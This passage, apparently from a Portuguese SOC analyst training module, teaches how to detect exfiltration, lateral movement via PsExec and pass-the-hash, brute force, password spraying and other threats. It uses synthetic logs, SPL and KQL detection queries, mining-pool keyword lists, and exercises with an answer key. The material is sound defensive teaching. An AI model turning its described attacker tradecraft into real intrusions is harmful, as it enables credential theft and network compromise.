**4.** (i) **Isolar o host** 10.10.30.7 da rede pelo EDR ou pela porta do switch, **sem desligar**; (ii) **desabilitar/bloquear a conta** `admin.rodrigo` e forçar expiração das sessões, porque uma conta administrativa agindo às 03h07 deve ser tratada como comprometida; (iii) **escalar imediatamente para o N2/plantão** e preservar evidência (logs de Segurança, Sysmon, conexões do firewall). Só depois disso vem a busca por outros hosts com o mesmo comportamento. Perguntar ao dono da conta "foi você?" antes de conter é o erro clássico: custa minutos que a criptografia usa.

**5.** Ordem: **(b) → (a) → (c)**. (b) é impacto **em andamento** — renomeação em massa é criptografia acontecendo agora, cada minuto significa mais arquivos perdidos, e a resposta é isolar o host de origem imediatamente. (a) é comprometimento provável mas ainda em fase de controle, sem destruição em curso — investigar qual processo abre a conexão. (c) é o mais fraco: 60 consultas TXT está dentro da faixa normal da tabela de limiares e sozinho não sustenta um caso; vale enriquecer com o domínio-pai e a unicidade dos subdomínios antes de qualquer escalada.

</details>


## Exfiltração de dados

### O que é

Imagine um funcionário desonesto que, todo dia, sai do escritório com algumas pastas de documentos escondidas dentro da mochila. Ninguém estranha porque ele sempre entrou e saiu por aquela porta. Só quando alguém pesa a mochila é que percebe: ele está levando muito mais para fora do que trouxe para dentro.

Exfiltração de dados (do inglês *data exfiltration*) é exatamente isso: a saída não autorizada de informação da empresa para as mãos do atacante. Na matriz MITRE ATT&CK isso está na tática **TA0010 — Exfiltration**, com técnicas como **T1041 (Exfiltration Over C2 Channel)** e **T1567 (Exfiltration Over Web Service)**.

### Como funciona — os canais

O dado precisa de um "cano" para sair. Os canais mais comuns:

| Canal | Como sai | Porta / protocolo típico | Onde o SOC enxerga |
|---|---|---|---|
| HTTPS + nuvem pública | Upload para Dropbox, Google Drive, WeTransfer, Mega | TCP/443 | Proxy (Zscaler, Netskope, Squid), firewall, CASB |
| DNS | Dado codificado dentro do nome consultado | UDP/53, TCP/53, DoH em 443 | Zeek `dns.log`, DNS do servidor interno |
| E-mail | Anexo enviado para conta pessoal | TCP/25, 587, 465 ou webmail em 443 | Gateway de e-mail, DLP |
| FTP / SFTP | Transferência direta para servidor externo | TCP/21, TCP/22 | Firewall, Zeek `conn.log` |
| USB | Cópia física para pendrive | — (não passa na rede) | EDR, log de dispositivo removível |
| Compartilhamento P2P / colaboração | Link público criado em SaaS | TCP/443 | CASB, log de API do SaaS |

**DLP** significa *Data Loss Prevention* — prevenção de perda de dados: é a ferramenta que lê o conteúdo do arquivo procurando padrões sensíveis (número de documento, planilha de clientes, marca d'água corporativa) e bloqueia ou registra o envio.

### Como detectar — quatro ângulos

1. **Por volume** — quanto saiu. Um usuário de escritório envia poucos megabytes por dia; 4 GB para um domínio novo é anomalia.
2. **Por horário** — 300 MB saindo às 03:12 de uma estação que normalmente dorme às 19:00.
3. **Por destino** — domínio recém-registrado, país sem operação da empresa, serviço de armazenamento não homologado.
4. **Por DLP** — o conteúdo em si bateu com uma regra ("planilha com coluna CPF", "documento classificado como Confidencial").

**A métrica que mais importa:** a razão *bytes de saída / bytes de entrada* comparada com a linha de base do próprio usuário. Navegação normal é assimétrica ao contrário — você **baixa** muito e envia pouco (razão típica de 0,05 a 0,2). Quando um host inverte isso e passa a enviar mais do que recebe, algo está subindo.

Exemplo prático: a estação `10.10.42.15` do usuário `jsilva` tem linha de base de 180 MB de download e 12 MB de upload por dia (razão 0,07). Na terça-feira registrou 90 MB de download e 3.400 MB de upload (razão 37,8) — 540 vezes acima do normal.

### Como aparece nos logs

Palo Alto, log TRAFFIC (formato CSV, campos separados por vírgula):

```
Jan 14 03:12:44 fw-core-01 1,2026/01/14 03:12:44,001801021234,TRAFFIC,end,2560,2026/01/14 03:12:44,10.10.42.15,203.0.113.77,192.0.2.9,203.0.113.77,Permit-Web,jsilva,,ssl,vsys1,TRUST,UNTRUST,ae1.100,ae1.200,LogFwd,2026/01/14 03:12:44,88213,1,51422,443,42118,443,0x400070,tcp,allow,3567891204,3489201,78690,4102,2026/01/14 02:41:03,689,file-sharing,0
```

Campos que interessam: `10.10.42.15` é a origem (`src`), `203.0.113.77` o destino (`dst`), `jsilva` o usuário autenticado, `443` a porta de destino, `bytes_sent = 3489201... ` — na posição de bytes a leitura correta é **bytes total 3567891204**, **bytes enviados 3489201xx**, **bytes recebidos 78690**. A categoria `file-sharing` fecha o quadro: quase 3,5 GB subindo para um site de compartilhamento.

Zeek, `conn.log` (campos separados por TAB):

```
#fields ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state
1768360364.221	CxT9kL2aBv1	10.10.42.15	51422	203.0.113.77	443	tcp	ssl	1842.550	3489201664	78690	SF
```

`orig_bytes` = bytes que o cliente enviou; `resp_bytes` = bytes que o servidor devolveu. Aqui a razão é 44.340 para 1. Isso não é navegação: é upload.

Consulta SPL (Splunk) para achar os maiores exportadores do dia:

```spl
index=firewall sourcetype=pan:traffic action=allow
| stats sum(bytes_out) AS saida, sum(bytes_in) AS entrada BY src_ip, user
| eval razao=round(saida/entrada,2)
| where saida > 1073741824 AND razao > 3
| sort - saida
```

Linha 1 filtra tráfego permitido do firewall. Linha 2 soma bytes por host e usuário. Linha 3 calcula a razão saída/entrada. Linha 4 mantém só quem enviou mais de 1 GB (1073741824 bytes) com razão acima de 3. Linha 5 ordena do maior para o menor.

KQL (Microsoft Sentinel / Defender):

```kql
// Uploads anômalos nas últimas 24h por dispositivo
DeviceNetworkEvents
| where TimeGenerated > ago(24h) and RemotePort == 443
| summarize Saida=sum(todouble(SentBytes)), Entrada=sum(todouble(ReceivedBytes)) by DeviceName, RemoteIP
| extend Razao = round(Saida / (Entrada + 1), 2)   // +1 evita divisão por zero
| where Saida > 1000000000 and Razao > 3
| order by Saida desc
```

### O que o SOC N1 observa

| Sinal | Normal | Suspeito |
|---|---|---|
| Razão saída/entrada | 0,05 a 0,3 | acima de 3, e muito acima da linha de base do host |
| Horário | dentro do expediente do usuário | madrugada, fim de semana, feriado |
| Destino | SaaS homologado da empresa | domínio novo, serviço não homologado, IP direto sem DNS |
| Duração | sessões curtas | uma sessão longa e contínua movendo gigabytes |

**Erro comum de analista júnior:** olhar só o total de bytes e fechar o alerta porque "o volume é normal para backup". Backup corporativo vai para destino conhecido, em janela conhecida, com conta de serviço conhecida (`svc_backup`). Se o destino é `203.0.113.77` e o usuário é `jsilva`, não é backup — é exfiltração até prova em contrário.

## Movimento lateral

### O que é

Um ladrão entra pela janela do quarto de hóspedes — o cômodo menos protegido da casa. Mas o cofre está no escritório. Então ele anda pelo corredor, testa as portas, usa a chave que achou na gaveta e vai chegando perto do que interessa. Esse caminho de dentro para dentro é o **movimento lateral** (MITRE ATT&CK, tática **TA0008 — Lateral Movement**).

Traduzindo para a rede: o atacante já comprometeu uma estação comum (o phishing tratado em outro trecho deste módulo costuma ser a porta de entrada) e agora salta de máquina em máquina até chegar ao servidor de arquivos, ao controlador de domínio ou ao banco de dados.

### Como funciona — os caminhos

| Técnica | Porta | Código MITRE | Rastro principal |
|---|---|---|---|
| RDP (Remote Desktop Protocol) | TCP/3389 | T1021.001 | 4624 tipo 10 |
| SMB / PsExec | TCP/445 | T1021.002 / T1570 | 4624 tipo 3, 5140, 7045 |
| WMI (Windows Management Instrumentation) | TCP/135 + porta dinâmica | T1047 | Sysmon 1 com pai `WmiPrvSE.exe` |
| WinRM / PowerShell Remoting | TCP/5985 (HTTP), 5986 (HTTPS) | T1021.006 | 4624 tipo 3, Sysmon 1 com pai `wsmprovhost.exe` |
| DCOM | TCP/135 | T1021.003 | Sysmon 1 com pai `mmc.exe` ou `excel.exe` |
| Tarefa agendada remota | TCP/445 (via `\\ADMIN$`) | T1053.005 | 4698, Sysmon 1 com pai `svchost.exe -k netsvcs` |
| Pass-the-hash | TCP/445 | T1550.002 | 4624 tipo 3, `LogonProcess=NtLmSsp`, sem 4768 correspondente |

**Pass-the-hash** merece explicação: a senha do Windows fica guardada em memória na forma de um resumo criptográfico chamado *hash*. Ferramentas como Mimikatz e Impacket conseguem ler esse resumo e usá-lo para autenticar **sem nunca saber a senha em texto**. Para o SOC, o rastro é uma autenticação NTLM em rede que aparece sem o pedido de ticket Kerberos (evento 4768) que normalmente a acompanharia.

### Os eventos que você precisa decorar

| EventID | Fonte | Significa |
|---|---|---|
| 4624 tipo 3 | Windows Security | Logon de **rede** (SMB, WMI, WinRM) |
| 4624 tipo 10 | Windows Security | Logon **RemoteInteractive** (RDP) |
| 4625 | Windows Security | Falha de logon |
| 5140 | Windows Security | Compartilhamento de rede acessado (`ADMIN$`, `C$`, `IPC$`) |
| 7045 | System | **Novo serviço instalado** — assinatura clássica de PsExec |
| 4697 | Windows Security | Serviço instalado (equivalente auditado do 7045) |
| 4698 | Windows Security | Tarefa agendada criada |
| Sysmon 1 | Sysmon | Criação de processo, com processo **pai** |

### Exemplo prático e logs

O atacante controla `10.10.42.15` (estação de `jsilva`) e salta para o servidor `10.10.7.20` (`srv-file-01.corp.local`) usando a conta `admin.rodrigo`.

Windows Security no servidor de destino:

```
EventID=4624
Logon Type: 3
New Logon:
  Account Name:  admin.rodrigo
  Account Domain: CORP
  Logon ID:      0x3E7A91
Network Information:
  Workstation Name: WKS-JSILVA
  Source Network Address: 10.10.42.15
  Source Port: 49877
Detailed Authentication Information:
  Logon Process: NtLmSsp
  Authentication Package: NTLM
```

`Logon Type: 3` = logon de rede. `Logon Process: NtLmSsp` com `Authentication Package: NTLM` em um domínio que usa Kerberos é o sinal de pass-the-hash. `Source Network Address` diz de qual máquina veio.

Logo em seguida, no mesmo servidor:

```
EventID=5140  Share Name: \\*\ADMIN$  Source Address: 10.10.42.15  Account Name: admin.rodrigo
EventID=7045  Service Name: PSEXESVC  Service File Name: %SystemRoot%\PSEXESVC.exe  Service Type: user mode service  Start Type: demand start
```

`ADMIN$` é o compartilhamento administrativo oculto. `PSEXESVC` é o serviço que o PsExec cria para executar comandos remotamente. Os dois juntos, na mesma janela de segundos, são movimento lateral com alta confiança.

Sysmon, evento 1 (criação de processo) no destino:

```xml
<EventID>1</EventID>
<Data Name="UtcTime">2026-01-14 03:19:07.442</Data>
<Data Name="Image">C:\Windows\System32\cmd.exe</Data>
<Data Name="CommandLine">cmd.exe /c whoami</Data>
<Data Name="User">CORP\admin.rodrigo</Data>
<Data Name="ParentImage">C:\Windows\PSEXESVC.exe</Data>
<Data Name="ParentCommandLine">C:\Windows\PSEXESVC.exe</Data>
```

O que denuncia é o **processo pai anômalo**: `cmd.exe` nascendo de `PSEXESVC.exe`, `WmiPrvSE.exe` ou `wsmprovhost.exe` significa que o comando veio de fora da máquina, não de alguém sentado no teclado.

### O padrão "uma estação falando com muitas estações"

Numa rede corporativa saudável, estações de trabalho conversam com **servidores** (arquivos, e-mail, proxy, controlador de domínio). Estações **não têm motivo para conversar entre si** — `WKS-JSILVA` não precisa abrir SMB em `WKS-MARIA`. Quando um único host abre conexões nas portas 445, 3389 ou 5985 contra dezenas de outras estações em poucos minutos, o desenho é inequívoco: alguém está varrendo e saltando.

```spl
index=firewall dest_port IN (445,3389,5985,5986,135)
| search src_ip="10.10.*" dest_ip="10.10.*"
| stats dc(dest_ip) AS destinos_distintos values(dest_port) AS portas BY src_ip
| where destinos_distintos > 15
| sort - destinos_distintos
```

Linha 1 filtra as portas de administração remota. Linha 2 mantém só tráfego interno para interno. Linha 3 conta destinos distintos por origem (`dc` = *distinct count*). Linha 4 alerta acima de 15 destinos.

**O que o SOC N1 observa:** normal é servidor de gerenciamento (SCCM, antivírus) falando com muitas estações — origem conhecida, conta de serviço, horário previsível. Suspeito é uma **estação de usuário** fazendo isso, ainda mais fora do expediente.

**Erro comum de analista júnior:** ver 4624 tipo 3 e classificar como benigno porque "logon de rede acontece o tempo todo". Acontece mesmo — o que importa é **quem**, **de onde** e **para quantos**. Conta administrativa vindo de uma estação de usuário comum é sempre para escalar.

## Brute force

### O que é

É o ladrão que testa uma chave, depois outra, depois outra, no mesmo cadeado, até abrir. Em segurança chamamos de **força bruta** (MITRE **T1110**): o atacante mantém **um usuário** e varia a senha centenas ou milhares de vezes.

### Como funciona

Os alvos preferidos são os serviços expostos à internet:

| Serviço | Porta | Onde aparece a falha |
|---|---|---|
| RDP | TCP/3389 | 4625 no servidor |
| VPN | UDP/1194, UDP/500+4500, TCP/443 | log do concentrador (FortiGate, ASA) |
| OWA / Exchange Web | TCP/443 | 4625 + log do IIS |
| SSH | TCP/22 | `/var/log/auth.log`, syslog |
| Aplicação web | TCP/443 | log HTTP 401/403 repetido |

No mundo Windows os dois eventos-chave são o **4625** (falha de logon) e o **4771** (falha de pré-autenticação Kerberos). O 4771 traz um código de resultado; `0x18` significa senha errada — é o código que aparece em ataque de senha.

### Exemplo prático e logs

O IP `198.51.100.42` bate 640 vezes na conta `maria.costa` no portal de acesso remoto, entre 02:40 e 02:51.

```
An account failed to log on.
EventID=4625
Account For Which Logon Failed:
  Account Name:  maria.costa
  Account Domain: CORP
Failure Information:
  Failure Reason: Unknown user name or bad password.
  Status:         0xC000006D
  Sub Status:     0xC000006A
Network Information:
  Workstation Name: -
  Source Network Address: 198.51.100.42
  Source Port: 44120
Logon Type: 3
```

`0xC000006A` no Sub Status significa **senha incorreta com usuário válido** — pior que `0xC0000064` (usuário não existe), porque confirma que a conta é real.

Kerberos:

```
EventID=4771  Kerberos pre-authentication failed.
  Account Name: maria.costa
  Service Name: krbtgt/CORP.LOCAL
  Client Address: ::ffff:198.51.100.42
  Failure Code: 0x18
```

FortiGate (formato chave=valor):

```
date=2026-01-14 time=02:47:19 devname="fgt-edge-01" devid="FG100F1234567890" logid="0101039426" type="event" subtype="vpn" level="alert" action="ssl-login-fail" remip=198.51.100.42 user="maria.costa" reason="sslvpn_login_permission_denied" msg="SSL user failed to logged in"
```

`remip` é o IP remoto, `user` a conta tentada, `action=ssl-login-fail` a falha.

### Detecção por limiar e janela

A regra clássica é: **N falhas para a mesma conta em M minutos**. Um bom ponto de partida é 10 falhas em 5 minutos, ajustado depois pela realidade da empresa.

```spl
index=wineventlog EventCode=4625
| bucket _time span=5m
| stats count AS falhas values(src_ip) AS origens BY _time, Account_Name
| where falhas >= 10
```

**O sinal crítico:** muitas falhas seguidas de **UM sucesso** (4624) para a mesma conta e o mesmo IP. Isso não é mais tentativa — é **comprometimento**. Trate como incidente imediato, não como alerta informativo.

```spl
index=wineventlog EventCode IN (4624,4625)
| eval resultado=if(EventCode=4625,"falha","sucesso")
| bucket _time span=10m
| stats count(eval(resultado="falha")) AS falhas, count(eval(resultado="sucesso")) AS sucessos BY _time, Account_Name, src_ip
| where falhas >= 15 AND sucessos >= 1
```

**Erro comum de analista júnior:** fechar o caso como "conta bloqueada, atacante não conseguiu". Verifique **sempre** se houve 4624 depois da rajada de 4625 — e verifique também se a mesma origem tentou outras contas.

## Password spraying

### O que é

Aqui o ladrão inverte a lógica: em vez de testar mil chaves no mesmo cadeado (e disparar o alarme), ele testa **a mesma chave** — a mais provável — em mil cadeados diferentes. Ninguém percebe, porque cada cadeado só foi tocado uma vez.

**Password spraying** (MITRE **T1110.003**) é força bruta invertida: **poucas tentativas em MUITAS contas**, com senhas óbvias do tipo estação-do-ano mais ano ou nome da empresa mais número.

### Como funciona

Três características definem o ataque:

1. **Abaixo do limiar de bloqueio.** Se a política do domínio bloqueia a conta após 5 falhas, o atacante tenta 2 ou 3 e para.
2. **Sincronizado.** Uma rajada de tentativas em muitas contas num intervalo curto, depois silêncio por horas, depois outra rajada com senha diferente.
3. **Distribuído.** Frequentemente vem de vários IPs para diluir ainda mais o sinal.

### Por que a regra de brute force não pega

A regra de força bruta olha **falhas por conta**. No spraying, cada conta acumula 2 ou 3 falhas — muito abaixo do limiar de 10. A regra fica em silêncio enquanto 400 contas são testadas. Para enxergar, é preciso girar o eixo da contagem: em vez de contar **falhas por conta**, contar **contas distintas com falha por IP de origem**.

### Exemplo prático e log

O IP `192.0.2.55` gera, entre 04:00 e 04:06, exatamente 2 eventos 4625 para cada uma de 213 contas diferentes do domínio `CORP`.

```
EventID=4625  Account Name: jsilva          Source Network Address: 192.0.2.55  Sub Status: 0xC000006A  Logon Type: 3
EventID=4625  Account Name: maria.costa     Source Network Address: 192.0.2.55  Sub Status: 0xC000006A  Logon Type: 3
EventID=4625  Account Name: admin.rodrigo   Source Network Address: 192.0.2.55  Sub Status: 0xC000006A  Logon Type: 3
EventID=4625  Account Name: svc_backup      Source Network Address: 192.0.2.55  Sub Status: 0xC000006A  Logon Type: 3
```

Nenhuma conta chegou perto do bloqueio. O padrão só existe quando você agrupa por origem.

### A query de detecção

SPL:

```spl
index=wineventlog EventCode=4625
| bucket _time span=15m
| stats dc(Account_Name) AS contas_distintas, count AS total_falhas BY _time, src_ip
| eval falhas_por_conta=round(total_falhas/contas_distintas,1)
| where contas_distintas >= 20 AND falhas_por_conta <= 4
| sort - contas_distintas
```

Linha 2 agrupa em janelas de 15 minutos. Linha 3 conta **contas distintas** (`dc`) e o total de falhas por IP. Linha 4 calcula a média de falhas por conta. Linha 5 é o coração da regra: muitas contas (20 ou mais) com poucas falhas cada (4 ou menos) — a assinatura exata do spraying.

KQL:

```kql
// Password spraying: muitas contas, poucas falhas por conta, mesma origem
SecurityEvent
| where TimeGenerated > ago(24h) and EventID == 4625
| summarize ContasDistintas = dcount(TargetAccount), TotalFalhas = count()
    by IpAddress, bin(TimeGenerated, 15m)
| extend FalhasPorConta = round(todouble(TotalFalhas) / ContasDistintas, 1)
| where ContasDistintas >= 20 and FalhasPorConta <= 4
| order by ContasDistintas desc
```

### Normal versus suspeito

| Observação | Brute force | Password spraying |
|---|---|---|
| Contas alvo | 1 (ou poucas) | dezenas a centenas |
| Falhas por conta | 50 a milhares | 1 a 4 |
| Dispara bloqueio de conta | sim | não (é o objetivo) |
| Eixo da detecção | falhas por conta | contas distintas por IP |
| Ruído em help desk | muitos chamados de conta bloqueada | nenhum |

**Erro comum de analista júnior:** ver 2 falhas de logon de um IP externo e descartar como "usuário errou a senha". Dois pontos: (a) um usuário legítimo erra a senha da própria conta, não a de 200 colegas; (b) sempre pivote a busca **pelo IP de origem**, não pela conta. É o pivô que revela o padrão.

### Exercícios — Exfiltração, movimento lateral, brute force e password spraying

1. **Cálculo.** O host `10.10.42.15` tem linha de base diária de 210 MB de entrada e 15 MB de saída. Hoje registrou 95 MB de entrada e 2.850 MB de saída. Calcule a razão saída/entrada da linha de base e a de hoje, e diga quantas vezes a razão aumentou.

2. **Leitura de log.** Você recebe estes três eventos do servidor `srv-file-01.corp.local` (10.10.7.20), todos entre 03:19:04 e 03:19:07:

```
EventID=4624  Logon Type: 3  Account Name: admin.rodrigo  Source Network Address: 10.10.42.15  Logon Process: NtLmSsp
EventID=5140  Share Name: \\*\ADMIN$  Source Address: 10.10.42.15  Account Name: admin.rodrigo
EventID=7045  Service Name: PSEXESVC  Service File Name: %SystemRoot%\PSEXESVC.exe
```

O que aconteceu? Qual técnica MITRE ATT&CK descreve isso e qual campo prova que a origem foi uma estação de usuário?

3. **Verdadeiro ou falso positivo?** Alerta: "Brute force detectado — 340 eventos 4625 para a conta `svc_backup` vindos de `10.10.7.20` em 6 minutos". A investigação mostra que `10.10.7.20` é o servidor de backup, que a senha da conta de serviço foi rotacionada às 02:00 daquele dia, e que não houve nenhum 4624 de sucesso depois. Verdadeiro ou falso positivo? Justifique e diga qual ação tomar.

4. **Qual o próximo passo?** Sua regra de spraying disparou: `192.0.2.55`, 213 contas distintas, 2 falhas por conta, janela de 04:00 a 04:06. Liste, em ordem, os três primeiros passos da investigação.

5. **Escolha da regra.** Um IP externo gerou, em 20 minutos, 3 falhas para cada uma de 60 contas. A regra de força bruta (limiar: 10 falhas por conta em 5 minutos) não disparou. Explique por quê e diga qual agregação faria o alerta aparecer.

<details><summary>Ver gabarito</summary>

**1.** Linha de base: 15 / 210 = **0,07**. Hoje: 2.850 / 95 = **30,0**. Aumento: 30,0 / 0,07 ≈ **428 vezes**. Além da razão, note que a entrada caiu (210 → 95 MB) enquanto a saída explodiu (15 → 2.850 MB): a máquina parou de navegar e passou a enviar. Isso descarta a hipótese de "usuário assistindo vídeo" e aponta para upload em massa. Próximo passo: identificar o destino no log do firewall/proxy e verificar se o serviço é homologado.

**2.** É **movimento lateral via PsExec**. A sequência é canônica: (a) 4624 tipo 3 = logon de rede; (b) 5140 em `ADMIN$` = o compartilhamento administrativo foi montado para copiar o binário; (c) 7045 = o serviço `PSEXESVC` foi instalado para executar comandos. A técnica é **T1021.002 (Remote Services: SMB/Windows Admin Shares)**, combinada com **T1569.002 (System Services: Service Execution)**. O campo que prova a origem é `Source Network Address: 10.10.42.15` — a faixa 10.10.42.x é de estações de usuário, não de servidores. Agravante: `Logon Process: NtLmSsp` em domínio Kerberos sugere **pass-the-hash (T1550.002)**. Escale imediatamente e isole `10.10.42.15`.

**3.** **Falso positivo** — mas exige ação. O quadro é uma conta de serviço com senha rotacionada e um servidor legítimo ainda usando a credencial antiga em loop de repetição. Três indícios confirmam: origem interna e conhecida, conta de serviço (não humana), ausência total de 4624 de sucesso depois. Um ataque real de força bruta viria de origem externa ou de host inesperado e, se bem-sucedido, deixaria um 4624. Ação: abrir chamado para a equipe de infraestrutura atualizar a credencial no serviço de backup, e criar exceção **específica** (essa conta, essa origem, esse serviço) — nunca uma exceção ampla que silencie a regra inteira.

**4.** Ordem correta: (1) **Confirmar se alguma tentativa teve sucesso** — buscar 4624 do IP `192.0.2.55` na janela de 04:00 a 04:20 e nas horas seguintes; um único sucesso transforma o caso em comprometimento de conta. (2) **Bloquear o IP** na borda e checar reputação e geolocalização, e verificar se o mesmo IP aparece em outros logs (VPN, OWA, proxy). (3) **Listar as contas alvo** e cruzar com contas privilegiadas, contas sem MFA (autenticação multifator) e contas órfãs — priorizando o reset de senha das que forem sensíveis. Em seguida, verificar se houve rajadas anteriores do mesmo IP ou de IPs vizinhos, o que indica campanha distribuída.

**5.** A regra não disparou porque o eixo de agregação é errado para esse ataque: ela conta **falhas por conta** e cada conta acumulou apenas 3 — abaixo do limiar de 10 e também abaixo do bloqueio de conta do domínio. O ataque é **password spraying (T1110.003)**. A agregação que revela é contar **contas distintas com falha agrupadas por IP de origem** numa janela de tempo (`stats dc(Account_Name) BY src_ip` no Splunk, `dcount(TargetAccount) by IpAddress` no KQL), alertando quando o número de contas distintas é alto e a média de falhas por conta é baixa.

</details>


## Outras ameaças que o N1 vê no plantão

As ameaças a seguir aparecem menos que phishing ou ransomware, mas quando aparecem costumam ser graves. Aqui o formato é mais curto: o que é, o rastro em log, como identificar e a ação do N1.

### Ameaça interna (insider threat)

**O que é:** o risco vem de dentro. É como um funcionário do banco que tem a chave do cofre — nenhum cadeado externo ajuda. Pode ser malicioso (vai sair da empresa e leva a base de clientes) ou negligente (copia planilha para o Google Drive pessoal para trabalhar em casa).

**Rastro em log:** acesso a repositórios que a pessoa nunca acessou, volume anormal de download, uso fora de horário, cópia para mídia removível (Windows Event ID 4663 em auditoria de objeto), upload para nuvem pessoal visto no proxy ou no CASB (Cloud Access Security Broker — o "porteiro" que fiscaliza serviços de nuvem).

```
Netskope Application Event
timestamp=2026-09-03T22:14:07Z user=maria.costa@empresa-exemplo.com.br
app="Google Drive" instance_id=personal activity=Upload
object="base_clientes_2026.xlsx" object_type=File file_size=48210432
src_ip=10.10.42.77 dst_country=US access_method=Client
policy="Bloquear instancia pessoal" action=alert app_category="Cloud Storage"
```

Campos: `instance_id=personal` é a chave — mesmo aplicativo (Google Drive), mas conta pessoal, não a corporativa. `activity=Upload` com `file_size` de 48 MB às 22h.

**O que o N1 observa:** normal é upload para a instância corporativa em horário comercial. Suspeito é instância pessoal, volume alto, arquivo com nome de base de dados, e — o sinal mais forte — pessoa em processo de desligamento. **Ação do N1:** não acuse ninguém. Documente, preserve os logs e escale para o N2 junto com o RH/Jurídico. Insider é caso sensível: nunca contate o usuário por conta própria.

### Ataque de cadeia de suprimentos (supply chain)

**O que é:** o atacante não invade você — ele envenena algo em que você confia. Como contaminar o leite na fábrica em vez de invadir cada casa. Exemplos: atualização de software assinada mas comprometida, biblioteca maliciosa no repositório de pacotes, acesso de um fornecedor de TI.

**Rastro em log:** processo legítimo e assinado fazendo conexão de rede estranha. É por isso que Sysmon Event ID 1 (criação de processo) somado ao 3 (conexão de rede) vale ouro.

```
Sysmon EventID=3 (Network connection detected)
Image: C:\Program Files\FornecedorX\agent.exe
User: NT AUTHORITY\SYSTEM
Protocol: tcp  Initiated: true
SourceIp: 10.10.42.31  SourcePort: 51204
DestinationIp: 203.0.113.88  DestinationPort: 443
DestinationHostname: cdn-update.example.com
```

**O que o N1 observa:** normal é o agente falar com o domínio oficial do fabricante. Suspeito é o mesmo binário falando com domínio recém-registrado, ou processo rodando como SYSTEM abrindo conexão para IP sem reputação. **Ação do N1:** confirmar se houve janela de atualização, verificar reputação do destino, checar se outras máquinas com o mesmo agente estão fazendo igual. Se sim, escale — vários hosts com o mesmo comportamento é o padrão clássico.

### Credential stuffing

**O que é:** o atacante pega listas de e-mail e senha vazadas de outros sites e testa em massa no seu portal. Diferente de brute force (que adivinha senhas) e de password spraying (uma senha em muitos usuários, tratado em outro trecho deste módulo) — aqui os pares já vêm prontos.

**Rastro:** muitas tentativas, usuários todos diferentes, taxa de sucesso baixa mas não zero, e user-agent repetido vindo de muitos IPs (botnet ou proxies).

```
FortiGate WAF
date=2026-09-03 time=09:12:44 devname="FGT-DMZ-01" type="utm" subtype="waf"
action="detected" srcip=198.51.100.204 dstip=10.20.5.10 dstport=443
service="HTTPS" url="/api/v1/login" httpmethod="POST"
agent="python-requests/2.31" msg="Rate limit threshold exceeded"
```

**Ação do N1:** listar os usuários que obtiveram sucesso (não só os que falharam), forçar reset e MFA nesses, e pedir bloqueio das faixas de origem.

### Cryptojacking

**O que é:** alguém usa a CPU da sua máquina para minerar criptomoeda. Como um vizinho ligando o chuveiro elétrico na sua tomada. Não rouba dado, mas indica comprometimento — a mesma porta de entrada serve para coisa pior.

**Rastro:** CPU em 100%, conexão persistente a pool de mineração, protocolo Stratum em portas como 3333, 4444, 5555, 8333, 14444; DNS para domínios com `pool`, `xmr`, `mine`.

```
Zeek dns.log
ts=1756900123.441  uid=CqB3sX1kLmN  id.orig_h=10.10.42.55  id.resp_h=10.10.0.53
query=pool.mining-node.example.com  qtype_name=A  rcode_name=NOERROR
answers=203.0.113.201  TTL=300
```

**Ação do N1:** isolar não é obrigatório, mas identifique o processo (Sysmon 1) e escale — cryptojacking em servidor quase sempre veio de exploração de vulnerabilidade exposta.

### DDoS (Distributed Denial of Service)

**O que é:** negação de serviço distribuída — milhares de origens inundam seu serviço até ele cair. Como mil pessoas ligando ao mesmo tempo para a mesma linha telefônica.

**Rastro:** explosão de sessões novas por segundo, pacotes pequenos, SYN sem ACK (SYN flood), ou tráfego UDP amplificado (DNS, NTP, memcached).

```
%ASA-6-302013: Built inbound TCP connection 88421 for outside:198.51.100.7/44120
 (198.51.100.7/44120) to dmz:10.20.5.10/443 (10.20.5.10/443)
%ASA-6-302014: Teardown TCP connection 88421 for outside:198.51.100.7/44120
 to dmz:10.20.5.10/443 duration 0:00:00 bytes 0 TCP Reset-O
```

Repare em `duration 0:00:00` e `bytes 0`: sessão criada e derrubada sem transferir nada — assinatura típica de flood. **Ação do N1:** confirmar impacto real (o serviço está lento ou fora?), acionar o provedor de mitigação e avisar o N2 imediatamente. DDoS é evento de disponibilidade, tem SLA curto.

### Ataques web: SQL injection, XSS e web shell

**O que é:** atacar a aplicação pela própria porta da frente (HTTP/HTTPS).

- **SQL injection (SQLi):** manipular a consulta ao banco pelos campos do site. Como escrever instruções extras no formulário de pedido do restaurante e a cozinha obedecer.
- **XSS (Cross-Site Scripting):** injetar script que roda no navegador de outro usuário, para roubar sessão.
- **Web shell:** arquivo malicioso carregado no servidor web que dá ao atacante uma linha de comando remota. É a persistência clássica após SQLi ou upload inseguro.

**Rastro:** WAF (Web Application Firewall — filtro específico de aplicação web) com assinaturas; picos de HTTP 500 e 403; e o sinal mais forte de web shell: o processo do servidor web criando processos filhos de sistema (`w3wp.exe` ou `httpd` gerando `cmd.exe` ou `/bin/sh`).

```
Palo Alto THREAT (CSV, campos selecionados)
2026-09-03 11:47:02,014201,THREAT,vulnerability,10.20.5.10,198.51.100.61,
443,52210,"WEB-DMZ","OUTSIDE","SQL Injection Attempt",
threatid=30801,severity=high,action=reset-both,url="/produtos.php?id=1"
```

```
Sysmon EventID=1 (Process Create)
ParentImage: C:\Windows\System32\inetsrv\w3wp.exe
Image: C:\Windows\System32\cmd.exe
User: IIS APPPOOL\DefaultAppPool
CommandLine: (comando de reconhecimento de sistema — nao reproduzido)
```

**O que o N1 observa:** WAF em `action=reset-both` = bloqueado, ruído comum de varredura da internet — anote e siga. Mas se depois do alerta de SQLi aparecer o Sysmon 1 acima, o cenário mudou: houve execução no servidor. **Erro comum de analista júnior:** fechar o alerta de WAF como falso positivo só porque foi bloqueado, sem checar se algum request semelhante passou com HTTP 200. **Ação do N1:** escalar imediatamente qualquer processo filho de servidor web.

## Tabela mestra de triagem — a cola de plantão

Uma linha por ameaça do módulo. Esta é a tabela para deixar aberta no plantão.

| Ameaça | Alerta típico no SIEM | Fonte de log primária | Primeira verificação | Critério de escalonamento |
|---|---|---|---|---|
| Phishing | "Usuário clicou em URL maliciosa" | Gateway de e-mail, proxy (Squid/Zscaler) | O clique retornou HTTP 200 ou foi bloqueado? Houve POST de credencial? | Página de login capturou credencial, ou houve download de anexo executado |
| Malware | "Endpoint detectou artefato" | EDR, Sysmon 1/3, Palo Alto THREAT | O arquivo foi quarentenado? O processo pai é normal? | Execução confirmada, ou detecção repetida no mesmo host |
